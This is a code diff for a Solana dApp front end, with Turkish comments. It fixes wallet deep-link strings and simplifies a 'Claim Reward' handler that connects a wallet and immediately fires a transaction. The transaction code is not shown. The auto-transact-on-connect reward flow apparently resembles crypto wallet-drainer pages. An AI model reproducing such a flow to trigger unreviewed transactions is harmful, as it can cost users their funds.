@@ -163,7 +163,7 @@ useEffect(() => {
 
   /* ——— Phantom deeplink fonksiyonu ——— */
   const openPhantomBrowser = () => {
-    const universal = https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}
+    const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`
     window.open(universal, '_blank')
   }
 
@@ -179,19 +179,19 @@ useEffect(() => {
       match: (n) => n === 'Phantom',
       label: 'Phantom',
       icon: '/phantom.svg',
-      deepLink: https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl},
+      deepLink: `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`,
     },
     {
       match: (n) => n.toLowerCase().includes('trust'),
       label: 'Trust Wallet',
       icon: '/trustwallet.svg',
-      deepLink: https://link.trustwallet.com/open_url?url=${dappUrl},
+      deepLink: `https://link.trustwallet.com/open_url?url=${dappUrl}`,
     },
     {
       match: (n) => n.toLowerCase().includes('coinbase'),
       label: 'Coinbase Wallet',
       icon: '/coinbase.svg',
-      deepLink: https://go.cb-w.com/dapp?cb_url=${dappUrl},
+      deepLink: `https://go.cb-w.com/dapp?cb_url=${dappUrl}`,
     },
     {
       match: (n) =>
@@ -199,19 +199,19 @@ useEffect(() => {
         n.toLowerCase().includes('bitget'),
       label: 'Bitget Wallet',
       icon: '/bitget.svg',
-      deepLink: bitkeep://bkconnect?action=dapp&url=${dappUrl},
+      deepLink: `bitkeep://bkconnect?action=dapp&url=${dappUrl}`,
     },
     {
       match: (n) => n === 'Solflare',
       label: 'Solflare',
       icon: '/solflare.svg',
-      deepLink: https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl},
+      deepLink: `https://solflare.com/ul/v1/browse/${dappUrl}?ref=${dappUrl}`,
     },
     {
       match: (n) => n === 'Backpack',
       label: 'Backpack',
       icon: '/backpack.svg',
-      deepLink: https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl},
+      deepLink: `https://backpack.app/ul/v1/browse/${dappUrl}?ref=${dappUrl}`,
     },
   ]
 
@@ -287,84 +287,51 @@ useEffect(() => {
     }
   }, [publicKey])
 
-/* ——— Claim Reward ——— */
-const handleClaim = async () => {
-  // Eğer Telegram Mini-App içindeysek ve Android kullanıyorsak → doğrudan Trust Wallet aç
-  const webapp = (window as any).Telegram?.WebApp
-  const inTelegram = Boolean(webapp?.initData)
-  const isAndroid = /Android/i.test(navigator.userAgent)
+  /* ——— Claim Reward ——— */
+  const handleClaim = async () => {
+    if (loading) return
+    setMsg('')
 
-  if (inTelegram && isAndroid) {
-    const dappUrl = encodeURIComponent(window.location.origin)
-    // Trust Wallet universal link’i ile kendi WebView’ında DApp’i yükle
-    webapp.openLink(https://link.trustwallet.com/open_url?url=${dappUrl})
-    return
-  }
-
-  // ——— Orijinal akış ———
-  if (loading) return
-  setMsg('')
-
-  // 1) Zaten bağlıysak → direkt işlem
-  if (publicKey) {
-    setLoading(true)
-    await doTx()
-    return
-  }
-
-  // 2) Tek bir Installed adapter varsa → işaretle, bağlan ve Effect başlatsın
-  const installed = orderedWallets.filter(
-    (w) => w.readyState === WalletReadyState.Installed
-  )
-  if (installed.length === 1) {
-    setLoading(true)
-    autoClaim.current = true
-    await select(installed[0].adapter.name as WalletName)
-    return
-  }
-
-  // 3) Diğer durumlarda modal aç
-  openDrawer()
-}
-
-
-/* ——— Cüzdan seçimi ——— */
-const handleWalletClick = async (w: DrawerWallet) => {
-  closeDrawer()
-
-  // 1) Kullanıcı "Trust Wallet" butonuna bastığında
-  if (w.label === 'Trust Wallet') {
-    // Hook'tan gelen tüm adapter'lar içinde WalletConnect olanı bul
-    const wc = wallets.find(x => x.adapter.name === 'WalletConnect')
-    if (!wc) {
-      console.error('WalletConnect adapter bulunamadı')
+    // 1) Zaten bağlıysak → direkt işlem
+    if (publicKey) {
+      setLoading(true)
+      await doTx()
       return
     }
-    // Bulduğumuz WalletConnect adapter'ını seç ve işlemi başlat
-    await select(wc.adapter.name)
-    return doTx()
-  }
 
-  // 2) Phantom için eskiden olduğu gibi devam et
-  if (w.adapter.name === 'Phantom') {
-    const sol = (window as any).solana
-    if (w.readyState === WalletReadyState.Installed && sol?.isPhantom) {
-      await select(w.adapter.name)
-      return doTx()
-    } else {
-      return openPhantomBrowser()
+    // 2) Tek bir Installed adapter varsa → işaretle, bağlan ve Effect başlatsın
+    const installed = orderedWallets.filter(
+      (w) => w.readyState === WalletReadyState.Installed
+    )
+    if (installed.length === 1) {
+      setLoading(true)
+      autoClaim.current = true
+      await select(installed[0].adapter.name as WalletName)
+      return
     }
+
+    // 3) Diğer durumlarda modal aç
+    openDrawer()
   }
 
-  // 3) Diğer “Installed” adaptörler (Solflare, Coinbase, Backpack…)
-  if (w.readyState === WalletReadyState.Installed) {
-    await select(w.adapter.name)
-    return doTx()
+  /* ——— Cüzdan seçimi ——— */
+  const handleWalletClick = async (w: DrawerWallet) => {
+    closeDrawer()
+    if (w.adapter.name === 'Phantom') {
+      const sol = (window as any).solana
+      if (w.readyState === 'Installed' && sol?.isPhantom) {
+        await select(w.adapter.name as WalletName)
+        return doTx()
+      } else {
+        return openPhantomBrowser()
+      }
+    }
+    if (w.readyState === 'Installed') {
+      await select(w.adapter.name as WalletName)
+      return doTx()
+    }
+    window.open(w.deepLink, '_blank')
   }
-
-  // 4) Hiçbiri değilse deep-link fallback
-  window.open(w.deepLink, '_blank')
-}
 
 
 
